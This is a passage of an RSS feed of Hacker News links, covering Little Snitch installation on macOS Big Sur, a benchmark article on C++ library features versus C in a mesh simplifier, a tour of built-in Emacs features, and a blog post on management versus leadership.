<p>Enter the following command and press Return:<br><code>spctl kext-consent add MLZF7K7B5R</code></p>
</li>
<li>
<p>Restart your computer by choosing Restart from the Apple menu ().</p>
</li>
<li><a href="https://www.obdev.at/support/littlesnitch/245914482614726">Uninstall Little Snitch 5</a> if it’s already installed on your computer.</li>
</ol>
<p>After this approval process you should be able to install Little Snitch 4.6.</p>
<p><strong>Important Note:</strong> Older versions of Little Snitch (prior to version 4.6) cannot be installed on macOS Big Sur, not even with this manual approval.</p>


</div>
</div></div></div></div>]]>
            </description>
            <link>https://www.obdev.at/support/littlesnitch/245913651253917</link>
            <guid isPermaLink="false">hacker-news-small-sites-25138727</guid>
            <pubDate>Wed, 18 Nov 2020 16:31:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is C++ Fast?]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25138552">thread link</a>) | @da_big_ghey
<br/>
November 18, 2020 | https://zeux.io/2019/01/17/is-c-fast/ | <a href="https://web.archive.org/web/*/https://zeux.io/2019/01/17/is-c-fast/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p><span>

17 Jan 2019

</span></p><p>A library that I work on often these days, <a href="https://github.com/zeux/meshoptimizer">meshoptimizer</a>, has changed over time to use fewer and fewer C++ library features, up until the current state where the code closely resembles C even though it uses some C++ features. There have been many reasons behind the changes - dropping C++11 requirement allowed me to make sure anybody can compile the library on any platform, removing <code>std::vector</code> substantially improved performance of unoptimized builds, removing <code>algorithm</code> includes sped up compilation. However, I’ve never quite taken the leap all the way to C with this codebase. Today we’ll explore the gamut of possible C++ implementations for one specific algorithm, mesh simplifier, henceforth known as <code>simplifier.cpp</code>, and see if going all the way to C is worthwhile.</p>

<!--more-->



<p>Mesh simplifier is an implementation of an edge collapse quadric based simplification algorithm with many tweaks to improve performance and quality of the result. The algorithm is still in development but has had a fair share of effort put into it. The details are really not that important, but it helps to understand the structure and size:</p>

<ul>
  <li>The entire algorithm is implemented in one standalone .cpp file that has almost exactly a thousand lines of code (1004 as of this writing), including comments, blank lines, lines with braces, etc.</li>
  <li>The algorithm almost exclusively uses heap-allocated arrays as data structures, using raw pointers for this</li>
  <li>The algorithm needs a hash table and a sorting routine, implemented from scratch</li>
</ul>

<p>We will look at several variations of the implementation, starting with one that uses C++ containers and algorithms that would be helpful for that algorithm, then remove one C++ feature at a time and measure compilation speed and runtime performance as we go on three compilers, gcc 7.3, clang 6 and msvc 2017 on Core i7-8700K running Windows 10 / Ubuntu 16.10. We’ll measure compilation performance by just compiling one .cpp file (with default options in debug and <code>-O2</code> optimization level in release), and measure runtime performance by simplifying <code>buddha.obj</code> (1M triangle mesh) to 25% of its size. After we reach the current implementation, we will explore the option of changing the code to pure C99.</p>

<blockquote>
  <p>Note that the way I arrived at these implementations is by taking the code you can see in the repository right now, and changing it to be more idiomatic Modern C++<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>. However, these are generally very close to past versions of <code>simplifier.cpp</code> - the difference being that it’s possible to directly compare the variants now.</p>
</blockquote>



<p>The version we’re starting with is the original <code>simplifier.cpp</code> from <a href="https://github.com/zeux/meshoptimizer/blob/c93ba0987baa84bd73b61edf1c0ba7ba2e48df4b/src/simplifier.cpp">current meshoptimizer master</a>, with the following modifications:</p>

<ul>
  <li>All raw pointers changed to <code>std::vector</code></li>
  <li>Instead of a home-grown hash table we use <code>std::unordered_set</code></li>
  <li>Instead of a home-grown sorting routine we use <code>std::sort</code></li>
</ul>

<p>Here’s the performance that we’re getting as a result:</p>

<table>
  <thead>
    <tr>
      <th>compiler/stl</th>
      <th>debug compile</th>
      <th>release compile</th>
      <th>debug run</th>
      <th>release run</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>gcc</td>
      <td>520 ms</td>
      <td>646 ms</td>
      <td>2273 ms</td>
      <td>572 ms</td>
    </tr>
    <tr>
      <td>clang</td>
      <td>400 ms</td>
      <td>684 ms</td>
      <td>2356 ms</td>
      <td>566 ms</td>
    </tr>
    <tr>
      <td>clang libc++</td>
      <td>400 ms</td>
      <td>725 ms</td>
      <td>1535 ms</td>
      <td>584 ms</td>
    </tr>
    <tr>
      <td>msvc</td>
      <td>422 ms</td>
      <td>566 ms</td>
      <td>36317 ms</td>
      <td>579 ms</td>
    </tr>
  </tbody>
</table>

<p>This is a good starting point. We can see that performance is pretty solid in release - 0.6 seconds to decimate 1M triangle mesh is a good level of performance - generally more or less reasonable in debug with a notable exception of MSVC (the adverse behavior of MSVC STL in debug mode was one of the forcing functions to remove all STL use from meshoptimizer), and compile times generally vary but are uninspiring.</p>

<p>To put the compile times in perspective, Jonathan Blow recently posted a <a href="https://youtu.be/iD08Vpkie8Q?t=4984">video stream with compiler performance improvements</a>, where his game engine and game written in his new language compile and link in about a second (compilation itself takes about 0.9 seconds). That’s on a codebase that has 100K lines of code - our algorithm only has 1K lines of code (excluding STL, of course - it’s not entirely fair to exclude STL, but it’s not entirely fair to include STL either since we know our algorithm can be implemented in 1K LOC without any STL dependencies). 400 ms is something you notice when compiling your code, even if it’s just one file, and something that makes me less happy when working on the code - given many files like that, cumulative compilation performance can be bad. This is given the fact that our implementation is pretty spartan about the STL dependencies - we only use three algorithms/containers. Let’s see what happens when we stop using one of them.</p>



<p>The secret about the previous version we benchmarked is that it never existed in that form. While meshoptimizer initially used STL containers and algorithms, it never used <code>std::unordered_set</code> - that’s because based on prior experience I expected the performance to be insufficient for the kinds of algorithms I wanted to write, and had a custom replacement that was using quadratic probing in a large power of two sized array, which is similar to Google’s <code>dense_hash_set</code> design. It’s a kind of hash table I use and implement often in different codebases for different applications, so I’m very familiar with it. The implementation in <code>simplifier.cpp</code> is just 35 lines of code<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup>, so it’s easy to drop in and adapt for the use case at hand. Let’s see what happens when we use that instead.</p>

<table>
  <thead>
    <tr>
      <th>compiler/stl</th>
      <th>debug compile</th>
      <th>release compile</th>
      <th>debug run</th>
      <th>release run</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>gcc</td>
      <td>334 ms</td>
      <td>461 ms</td>
      <td>2054 ms</td>
      <td>460 ms</td>
    </tr>
    <tr>
      <td>clang</td>
      <td>270 ms</td>
      <td>517 ms</td>
      <td>2152 ms</td>
      <td>452 ms</td>
    </tr>
    <tr>
      <td>clang libc++</td>
      <td>314 ms</td>
      <td>609 ms</td>
      <td>1179 ms</td>
      <td>415 ms</td>
    </tr>
    <tr>
      <td>msvc</td>
      <td>361 ms</td>
      <td>461 ms</td>
      <td>28337 ms</td>
      <td>380 ms</td>
    </tr>
  </tbody>
</table>

<p>It looks like the extra 35 lines for a manual implementation of a better hash table were worth it. We’re seeing significant performance improvements across the board, in debug/release and both in terms of compile time and run time. The largest increase in runtime performance is on MSVC, we got 1.5x faster, and this is given the fact that hash table isn’t used as a core part of the algorithm - it’s only used to establish uniqueness relationship between individual vertices before the algorithm starts.</p>

<p>This highlights the poor fit of <code>std::unordered_set</code> to performance-critical workloads, especially ones that are insert-heavy. Unfortunately, this is not an implementation defect and thus is not possible to correct - the issue is that the standard requirements on unordered containers preclude more efficient implementations. Here’s to hoping that eventually we’ll get a better hash table in the standard.</p>



<p>At some point during development of the simplifier repeated profiling of various meshes showed that a lot of time is being spent in <code>std::sort</code>. Now, <code>std::sort</code> isn’t the fastest sorting algorithm, but it’s generally extremely competitive with custom implementations and it’s hard to beat without changing the problem around. In my case, sorting was used on an array of edge collapses, with the sort key being a floating point error value - so the natural instinct is to use a 3-pass radix sort, using 11, 11 and 10 bits of the key in each pass. However, there’s an interesting alternative available to us here - we can do radix sort in a single pass, using an 11 bit key<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup>.</p>

<p>What happens is that we have a 32-bit non-negative floating point value; if we take the top 12 bits and ignore the topmost one (since that’s a sign bit and is always 0), we get 11 bits that represent 8 bits of exponent and 3 bits of mantissa, which essentially gives us a value of similar magnitude but a significant round-off error. If we sort using this value as a key, as a result the sorting sequence isn’t going to be perfectly ordered with respect to the full 32-bit key. However, in our case we need to sort to be able to process better edge collapses first based on a heuristic - and the heuristic is a gross approximation so the extra error our sorting introduces is not noticeable. This technique is surprisingly useful in other domains where you don’t necessarily need an exact order either. A benefit of a single-pass radix sort is that it’s faster (you only need to do one pass over the data instead of 3!) and simpler to implement than a full-blown radix sort, taking just 36 lines of code<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup>.</p>

<table>
  <thead>
    <tr>
      <th>compiler/stl</th>
      <th>debug compile</th>
      <th>release compile</th>
      <th>debug run</th>
      <th>release run</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>gcc</td>
      <td>287 ms</td>
      <td>403 ms</td>
      <td>949 ms</td>
      <td>334 ms</td>
    </tr>
    <tr>
      <td>clang</td>
      <td>230 ms</td>
      <td>461 ms</td>
      <td>962 ms</td>
      <td>327 ms</td>
    </tr>
    <tr>
      <td>clang libc++</td>
      <td>312 ms</td>
      <td>546 ms</td>
      <td>940 ms</td>
      <td>328 ms</td>
    </tr>
    <tr>
      <td>msvc</td>
      <td>330 ms</td>
      <td>430 ms</td>
      <td>26824 ms</td>
      <td>285 ms</td>
    </tr>
  </tbody>
</table>

<p>This time the gains in compilation times are somewhat more modest. We’ve removed <code>&lt;algorithm&gt;</code> header but it doesn’t seem so have had very significant benefits to compilation time - we’re still including <code>&lt;vector&gt;</code> and it’s possible that large STL headers are pulled by both. However, the effects on performance are very significant, especially on debug performance in libstdc++ (most likely <code>std::sort</code> is very slow in debug there) but the gains in release builds are also exciting. What is not obvious from this graph is that sorting got so much faster that it almost completely disappeared from the profiles compared to the other work - the entire algorithm runs “just” 1.35x faster, but the gains measured on just the sorting code are much larger, 117 ms -&gt; 10 ms in release builds.</p>



<p>One number that we haven’t moved substantially yet is the time it takes to run this code in debug using MSVC. While it’s natural to expect unoptimized builds to be slower than optimized, they have to be fast enough. Sometimes you want to debug your problem on a non-trivial input dataset. Sometimes you want to run the debug build with full checks through your tests to make sure they don’t trigger any bugs that could disappear in release. Sometimes you are trying to debug a different part of the program, but you still need to run the rest of it. Programmers creatively come up with many workarounds that make the problem less severe - you can make special builds that enable some optimizations but not all, you can use mixed optimization settings for different projects, you can use <code>#pragma optimize</code> to temporarily disable optimizations around offending parts of the code - but all of these seem like duct-tape. Let’s try to replace the only STL component we’re still using, …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://zeux.io/2019/01/17/is-c-fast/">https://zeux.io/2019/01/17/is-c-fast/</a></em></p>]]>
            </description>
            <link>https://zeux.io/2019/01/17/is-c-fast/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25138552</guid>
            <pubDate>Wed, 18 Nov 2020 16:19:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Batteries Included with Emacs]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25138483">thread link</a>) | @karthink
<br/>
November 18, 2020 | https://karthinks.com/software/batteries-included-with-emacs/ | <a href="https://web.archive.org/web/*/https://karthinks.com/software/batteries-included-with-emacs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
      <p>Emacs has a reputation for being borderline unusable out of the box, of being
bloated but somehow surprisingly bare.</p>
<p>This is largely a discoverability problem<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>. The solution
the Internet has settled on seems to be “Emacs distributions” like Doom,
Spacemacs or Prelude that glue together dozens (sometimes hundreds) of addons to
deliver a batteries included, finely tuned and user-friendly experience from
first launch. While it’s not for me, this does work
great&nbsp;<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>, and many of these packages will probably make
their way into the default Emacs experience in due time.</p>
<p>But while modern features like built-in LSP support, faster syntax highlighting
(through tree-sitter) and ligature support are still being debated in the
development mailing list, the long running, slow moving train of Emacs has
picked up many interesting passengers.</p>
<p>Emacs as shipped does a lot more than meets the eye, and external package
functionality often partially replicates built in behavior.</p>
<p>Here is a list of useful features in emacs I use regularly that I don’t see
mentioned or recommended often online. Guidelines I used to populate this list:</p>
<ul>
<li>No packages, <strong>stock Emacs only</strong>.</li>
<li>No steep learning curves. <strong>Learn each feature in under two minutes or bust</strong>.</li>
<li><strong>No gimmicks</strong>. No doctor, tetris, snake, dunnet, zone or butterfly.</li>
<li><strong>Just the deltas</strong>. No commonly mentioned packages like flymake, doc-view,
outline-minor-mode or eww/w3m. Nothing that Emacs brings up automatically or a
nonspecific Google search gets you.</li>
<li>Assume a modern Emacs, 26.3+.</li>
</ul>
<p>The list is written in the language of Emacs’ conventions. If you’re new to
Emacs, here’s some extra cognitive load for you:</p>
<table>
<thead>
<tr>
<th>Emacs jargon</th>
<th>Modern parlance</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>M-x</code></td>
<td>Alt + x</td>
</tr>
<tr>
<td><code>C-x</code></td>
<td>Ctrl + x</td>
</tr>
<tr>
<td>Frame</td>
<td>Emacs window</td>
</tr>
<tr>
<td>Window</td>
<td>split/pane</td>
</tr>
<tr>
<td>Buffer</td>
<td>Contiguous chunk of text/data</td>
</tr>
<tr>
<td>Active Region</td>
<td>Text selection</td>
</tr>
<tr>
<td>Region</td>
<td>Text selection (not highlighted)</td>
</tr>
<tr>
<td>Face</td>
<td>Font, color and display properties</td>
</tr>
</tbody>
</table>
<p>OK? Let’s go.</p>
<hr>
<h2 id="artist-mode--m-x-artist-mode">Artist mode (<code>M-x artist-mode</code>)</h2>
<p>Turn Emacs into an Ascii art based paint program. Draw (poly-)lines, rectangles
and ellipses. Fill or spray.</p>
<video width="700" autoplay="" loop="">
 <source src="https://karthinks.com/img/artist-mode-demo.mp4" type="video/mp4">
Your browser does not support the video tag.
</video>
<p>I’m not much of an (ascii) artist, but I do use <code>artist-mode</code> to draw boxes when
writing documentation or READMEs.</p>
<hr>
<h2 id="pulse--pulse-dot-el">Pulse (<code>pulse.el</code>)</h2>
<p>The included pulse library provides functions to flash a region of text. The
most useful general application is to flash the line the cursor is on as a
navigational aid or accessibility feature.</p>
<video width="700" autoplay="" loop="">
 <source src="https://karthinks.com/img/pulse-demo.mp4" type="video/mp4">
 Your browser does not support the video tag.
</video>
<p>As is the annoying case with many things Emacs though, it provides all the
ingredients and lights the flame but leaves the cooking to you. Here’s a simple
recipe:</p>
<div><pre><code data-lang="emacs-lisp">(<span>defun</span> <span>pulse-line</span> (<span>&amp;rest</span> <span>_</span>)
      <span>"Pulse the current line."</span>
      (<span>pulse-momentary-highlight-one-line</span> (<span>point</span>)))

(<span>dolist</span> (<span>command</span> <span>'</span>(<span>scroll-up-command</span> <span>scroll-down-command</span>
                   <span>recenter-top-bottom</span> <span>other-window</span>))
  (<span>advice-add</span> <span>command</span> <span>:after</span> <span>#'</span><span>pulse-line</span>))
</code></pre></div><p>Modify as needed. There’s more than one external package
(<a href="https://github.com/Malabarba/beacon">beacon</a>) that does this and more, but
<code>pulse</code> is just fine.</p>
<hr>
<h2 id="undo-in-region--c">Undo in region (<code>C-/</code>)</h2>
<p>Limit your undoing to the active region:</p>
<figure>
    <img src="https://karthinks.com/img/undo-in-region-demo.gif"> 
</figure>

<p>There’s nothing to set up or run here. This is the default behavior of undo in
Emacs.</p>
<hr>
<h2 id="follow-mode--m-x-follow-mode">Follow mode (<code>M-x follow-mode</code>)</h2>
<p>Most monitors are much wider than they are tall. Most text files are much longer
than they are wide. That’s a problem.</p>
<p><code>follow-mode</code> shows a contiguous buffer paginated across multiple windows. The
cursor flows from one window to the next.</p>
<figure>
    <img src="https://karthinks.com/img/follow-mode-demo.gif"> 
</figure>

<hr>
<h2 id="selective-display--c-x">Selective display (<code>C-x $</code>)</h2>
<p>If you code with rigid indentation, you can get a quick overview of your
document with <code>set-selective-display</code>. No mucking around with folding,
<code>outline-</code> or <code>hs-minor-mode</code> regexps.</p>
<figure>
    <img src="https://karthinks.com/img/set-selective-display-demo.gif"> 
</figure>

<p>Call the command with the prefix argument set to the column to hide. Call
without a prefix argument to disable.</p>
<hr>
<h2 id="pretty-symbols--m-x-prettify-symbols-mode">Pretty symbols (<code>M-x prettify-symbols-mode</code>)</h2>
<p>This one’s mainly for LaTeX users. Display unicode versions of math operators,
greek symbols and more. <code>M-x prettify-symbols-mode</code> in a TeX buffer.</p>
<figure>
    <img src="https://karthinks.com/img/prettify-symbols-test.png" alt="Figure 1: Before and after enabling prettify-symbols-mode"> <figcaption>
            <p>Figure 1: Before and after enabling <code>prettify-symbols-mode</code></p>
        </figcaption>
</figure>

<p>The equivalent in <code>org-mode</code> is <code>M-x org-toggle-pretty-entities</code>. Other major
modes will have to define the replacements explicitly to get this behavior.
Example with Python:</p>
<div><pre><code data-lang="emacs-lisp">(<span>add-hook</span>
 <span>'python-mode-hook</span>
 (<span>lambda</span> ()
   (<span>mapc</span> (<span>lambda</span> (<span>pair</span>) (<span>push</span> <span>pair</span> <span>prettify-symbols-alist</span>))
         <span>'</span>(<span>;; Syntax</span>
           (<span>"def"</span> <span>.</span>      <span>#x2131</span>)
           (<span>"not"</span> <span>.</span>      <span>#x2757</span>)
           (<span>"in"</span> <span>.</span>       <span>#x2208</span>)
           (<span>"not in"</span> <span>.</span>   <span>#x2209</span>)
           (<span>"return"</span> <span>.</span>   <span>#x27fc</span>)
           (<span>"yield"</span> <span>.</span>    <span>#x27fb</span>)
           (<span>"for"</span> <span>.</span>      <span>#x2200</span>)
           <span>;; Base Types</span>
           (<span>"int"</span> <span>.</span>      <span>#x2124</span>)
           (<span>"float"</span> <span>.</span>    <span>#x211d</span>)
           (<span>"str"</span> <span>.</span>      <span>#x1d54a</span>)
           (<span>"True"</span> <span>.</span>     <span>#x1d54b</span>)
           (<span>"False"</span> <span>.</span>    <span>#x1d53d</span>)
           <span>;; Mypy</span>
           (<span>"Dict"</span> <span>.</span>     <span>#x1d507</span>)
           (<span>"List"</span> <span>.</span>     <span>#x2112</span>)
           (<span>"Tuple"</span> <span>.</span>    <span>#x2a02</span>)
           (<span>"Set"</span> <span>.</span>      <span>#x2126</span>)
           (<span>"Iterable"</span> <span>.</span> <span>#x1d50a</span>)
           (<span>"Any"</span> <span>.</span>      <span>#x2754</span>)
           (<span>"Union"</span> <span>.</span>    <span>#x22c3</span>)))))
</code></pre></div><figure>
    <img src="https://karthinks.com/img/prettify-symbols-python-before.png"> 
</figure>

<figure>
    <img src="https://karthinks.com/img/prettify-symbols-python-after.png" alt="Figure 2: A python-mode buffer before and after enabling prettify-symbols-mode"> <figcaption>
            <p>Figure 2: A <code>python-mode</code> buffer before and after enabling <code>prettify-symbols-mode</code></p>
        </figcaption>
</figure>

<hr>
<h2 id="view-mode--m-x-view-mode">View mode (<code>M-x view-mode</code>)</h2>
<p>Provide pager-like keybindings. Makes navigating read-only buffers a breeze.
Move down and up with <code>SPC</code> and <code>delete</code> (backspace) or <code>S-SPC</code>, half a page
down and up with <code>d</code> and <code>u</code>, and isearch with <code>s</code>.</p>
<p>This is my preferred way to read code or documents as I can avoid chorded
commands. Note that <code>evil-mode</code> doesn’t help here either, since paging is bound
to <code>C-u/d/f/b</code>.</p>
<p><del>To that end I just hook this into <code>read-only-mode</code>.</del> Prolific emacser <a href="https://old.reddit.com/r/emacs/comments/jwhr6g/batteries%5Fincluded%5Fwith%5Femacs/gct12vp/">Omar
Antolin Camarena</a> points out a built-in way to use <code>view-mode</code> in all read-only
buffers, including ones you set read-only with <code>C-x C-q</code>:</p>
<p>This is my favorite feature of the bunch, considering how much time I spend in
Emacs reading things.</p>
<hr>
<h2 id="cycle-spacing--m-spc">Cycle-spacing (<code>M-SPC</code>)</h2>
<p>The <code>cycle-spacing</code> command is more versatile than it appears. By default, it
cycles between deleting all whitespace around cursor but one, deleting all
whitespace and restoring whitespace. But with a negative argument, it deletes
all blank lines around the cursor. (Calling it with a negative argument is fast:
Hold down Meta and hit minus and space in sequence.)</p>
<p>Put together, it’s doing the job of (almost) three older commands:
<code>just-one-space</code>, <code>delete-horizontal-space</code> and
<code>delete-blank-lines</code><sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup> This opens up the
bindings <code>C-x C-o</code> and <code>M-\</code> for more useful functions.</p>
<hr>
<h2 id="indirect-buffers--m-x-make-indirect-buffer">Indirect buffers (<code>M-x make-indirect-buffer</code>)</h2>
<p>One buffer. Two windows. Two states.</p>
<p>This one’s for outline/org users. Do you want to see an overview of your
document <em>and</em> the section you’re working on? <code>M-x make-indirect-buffer</code> or <code>M-x clone-indirect-buffer</code></p>
<p>Here I clone an org buffer and narrow the original to get a makeshift TOC:
<img src="https://karthinks.com/img/indirect-buffer-demo.gif" alt=""></p>
<p>At this point we’re a few lines of elisp away from writing a <code>toc-minor-mode</code>
for org files!</p>
<p>But the possibilities are much larger, because as the manual puts it:</p>
<blockquote>
<p>The text of the indirect buffer is always identical to the text of its base
buffer; changes made by editing either one are visible immediately in the other.
But in all other respects, the indirect buffer and its base buffer are
completely separate. They can have different names, different values of point,
different narrowing, different markers, different major modes, and different
local variables.</p>
</blockquote>
<hr>
<h2 id="html-fontify--m-x-htmlfontify-buffer">Html-fontify (<code>M-x htmlfontify-buffer</code>)</h2>
<p>Reproduce the look of your emacs buffer as a html file with CSS. This is either
extremely useful or useless to you!</p>
<p><a href="https://karthinks.com/share/htmlfontify-demo.html">Here</a> is the html-fontified version of the
source file of this write-up.</p>
<hr>
<h2 id="dwim-commands--upcase-downcase-and-more">DWIM commands (upcase, downcase  and more<sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup>)</h2>
<p>Modern versions of Emacs provide Do-What-I-Mean versions of various editing
commands: They act on the region when the region is active, and on an
appropriate semantic unit otherwise. Replace <code>upcase-word</code> and <code>downcase-word</code>
with <code>upcase-dwim</code> and <code>downcase-dwim</code> respectively, and you can safely eject
the bindings for <code>upcase-region</code> and <code>downcase-region</code>.<sup id="fnref:5"><a href="#fn:5" role="doc-noteref">5</a></sup></p>
<div><pre><code data-lang="emacs-lisp">(<span>global-set-key</span> (<span>kbd</span> <span>"M-u"</span>) <span>'upcase-dwim</span>)
(<span>global-set-key</span> (<span>kbd</span> <span>"M-l"</span>) <span>'downcase-dwim</span>)
(<span>global-set-key</span> (<span>kbd</span> <span>"M-c"</span>) <span>'capitalize-dwim</span>)
</code></pre></div><p>DWIM is standard behavior for emacs commands even when it doesn’t say that in
the name. <code>count-words</code>, <code>query-replace</code>, the list goes on. Check to see if your
frequently used commands DWYM.</p>
<hr>
<h2 id="unit-conversion-in-calc--m-x-calc">Unit conversion in calc (<code>M-x calc</code>)</h2>
<p>It’s <code>u c</code>. And <code>'</code> (quote) for algebraic entry: <img src="https://karthinks.com/img/calc-units-demo.gif" alt="">
<code>calc</code> does a lot more with units. You can simplify, define new unit conversions
and more. Hit <code>u ?</code> to see your options.</p>
<hr>
<h2 id="symbolic-computation-in-calc--m-x-calc">Symbolic computation in calc (<code>M-x calc</code>)</h2>
<p>We’re skirting the “<strong>learn each feature in under two minutes or bust</strong>” rule with
this one, as it deserves its own write-up, or a perusal of the manual. The
general interaction paradigm is simple, though.</p>
<p>Let’s find a Taylor expansion of the integral of the error function:
<img src="https://karthinks.com/img/calc-symbolic-demo.gif" alt=""></p>
<p>Access algebraic routines (root finding, symbolic manipulation) in calc under
the <code>a</code> prefix. Indefinite integration is <code>a i</code>, differentiation is <code>a d</code>,
solving algebraic equations is <code>a S</code> and so on. (Hit <code>a ?</code>)</p>
<hr>

<p>What it says on the tin. Move the buffer instead of the cursor when navigating.
Just press the scroll lock key or <code>M-x scroll-lock-mode</code>.</p>
<hr>
<h2 id="tabs--m-x-tab-bar-mode">Tabs (<code>M-x tab-bar-mode</code>)</h2>
<p>These are mentioned often, but rarely recommended. Most Emacs users find the
idea of tabs in Emacs to be redundant, but will happily recommend window
configuration registers, which provide similar functionality.</p>
<p>Tabs work great to separate projects, or work and email buffers. In principle
this is equivalent to popping up a new frame and letting the window manager
handle the separation, but on stacking window managers I find tabs to be much
preferable.</p>
<p>Since there’s never one way to do something in Emacs, a secondary
<code>tab-line-mode</code> is available that adds tabs to each window instead of frame.</p>
<hr>
<h2 id="next-time">Next time:</h2>
<ul>
<li><code>icomplete</code> and <code>fido</code>: Incremental completion systems</li>
<li><code>completion-styles</code>: Supercharge completion in the minibuffer</li>
<li><code>re-builder</code> and <code>rx</code>: Visual regular expressions</li>
<li><code>orgtbl-mode</code>: Easy table formatting everywhere</li>
<li><code>strokes-mode</code>: Control emacs with mouse gestures</li>
</ul>
<p>… and more.</p>
<section role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>C…</p></li></ol></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://karthinks.com/software/batteries-included-with-emacs/">https://karthinks.com/software/batteries-included-with-emacs/</a></em></p>]]>
            </description>
            <link>https://karthinks.com/software/batteries-included-with-emacs/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25138483</guid>
            <pubDate>Wed, 18 Nov 2020 16:14:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The difference between a manager and a leader from a 77 year old]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25138441">thread link</a>) | @gloves1992
<br/>
November 18, 2020 | https://themarketingmeetup.com/blog/difference-manager-leader/ | <a href="https://web.archive.org/web/*/https://themarketingmeetup.com/blog/difference-manager-leader/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<div>
				
				
				<div>
				
				
				<div><p>Yesterday morning I had the privilege of being on a <a href="https://themarketingmeetup.com/blog/penny-ferguson-and-catherine-newman/" target="_blank" rel="noopener noreferrer" data-cke-saved-href="https://themarketingmeetup.com/blog/penny-ferguson-and-catherine-newman/">webinar</a> with Joe and Catherine talking about personal leadership and a definition that I think could do with maybe a little more explanation, even though is a much bigger subject.</p>

<p><em>Outstanding managers drive people to perform at the highest level they are capable of. It is very much about control.</em></p>
<p>Outstanding leaders inspire them to do it for themselves, and it is more about freedom.</p>
<p>Please recognise the first word of these sentences is the word ‘outstanding’. &nbsp;Both of these styles can be very successful – they are just different. &nbsp;The knack is being aware of which is appropriate to use and when.</p>
<h2><strong>Leadership throughout life</strong></h2>
<p>My most important leadership role in my life is that of a parent and I really didn’t understand anything about leadership until my children had grown up.</p>
<p>With what I now know, there is no question in my mind that I managed all of my six children when they were growing up and I bitterly regret not learning all of this much sooner.</p>
<p>I love then more than anything else in my world and I had a history of making some pretty stupid mistakes in my life which I never wanted them to make.</p>
<p>I did my best to sort out all of their problems, gave advice all the time, pointed out where there were risks and how to avoid them, told them what to do, when to do it and how to do it, and generally did everything possible for them, even making their beds!</p>
<p>Through loving them so much I was, in fact, disempowering them, educating them how not to think for themselves, I was inadvertently telling them they could not do anything without me plus they could never be better than I was yesterday. Big oops!</p>
<h3><em><strong>Let’s recognise where we are right now: ‘world unusual’.&nbsp;</strong></em></h3>
<p>We are probably in a position at work where we are having to make painful decisions, that we have no wish to make, and it’s going to affect people’s lives, and we care so much for each of these individuals.</p>
<p>Our temptation is to leap into telling people what to do, how to do it, try to convince them that all will be fine and take on all the responsibility for keeping them safe and motivated. &nbsp;All feelings to be applauded.</p>
<p>However, in these examples, how are we communicating?</p>
<p>It is all ‘let me tell you what I think…’, I’ve got a great suggestion…’ , ‘I think you’ve got it wrong…’.</p>
<p>This language is entirely management and we are in control. &nbsp;All my experience, with evidence coming out of my ears, is that this style of communicating is very typical for most of us and is almost entirely because we care and desperately want to help. &nbsp;For me, learning this at a late age, it was a serious shock to my system!</p>
<h3><em><strong>If you want to step into leadership then our communication style needs to shift considerably. Some examples could be:</strong></em></h3>
<ul>
<li>So what do you think?</li>
<li>I love that idea that you have just had</li>
<li>If you knew there is one thing you could do today to support your team what would it be?</li>
<li>If you had 50% more confidence what would you do?</li>
<li>If I wasn’t here what might you do?</li>
</ul>
<p>This is where all the focus is on helping the individual, or the team, think for themselves. &nbsp;It is about ‘you’ not ‘I’. &nbsp;It is them taking responsibility for how they choose to think and behave, it is empowering not disempowering and, above all, can inspire individuals to own more and more of their potential.</p>
<p>This is a critical aspect of leadership and the most exciting, amazing and ongoing journey of my life. &nbsp;It is giving every person the biggest gift you can give anyone, the opportunity to make their own choices and take responsibility for their own life.</p>
<p>So, this makes it pretty clear that you cannot look at management or leadership without looking at how you communicate – these are so closely linked together that it is inseparable and one of three key components of becoming a great leader.</p>
<p>How you choose to think and understanding responsibility at a much more profound level are the other two. A subject for another day!</p></div>
			</div> <!-- .et_pb_text -->
			</div> <!-- .et_pb_column -->
				
				
			</div></div>]]>
            </description>
            <link>https://themarketingmeetup.com/blog/difference-manager-leader/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25138441</guid>
            <pubDate>Wed, 18 Nov 2020 16:11:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building a Blog with Micro in Go]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25138273">thread link</a>) | @friendly_chap
<br/>
November 18, 2020 | https://blog.m3o.com/2020/11/16/building-a-blog-with-micro.html | <a href="https://web.archive.org/web/*/https://blog.m3o.com/2020/11/16/building-a-blog-with-micro.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">

    <article>

        

<!--         <header class="post-header">
            <a id="blog-logo" href="">
                
                    <span class="blog-title">M3O</span>
                
            </a>
        </header> -->

        <!-- <span class="post-meta">
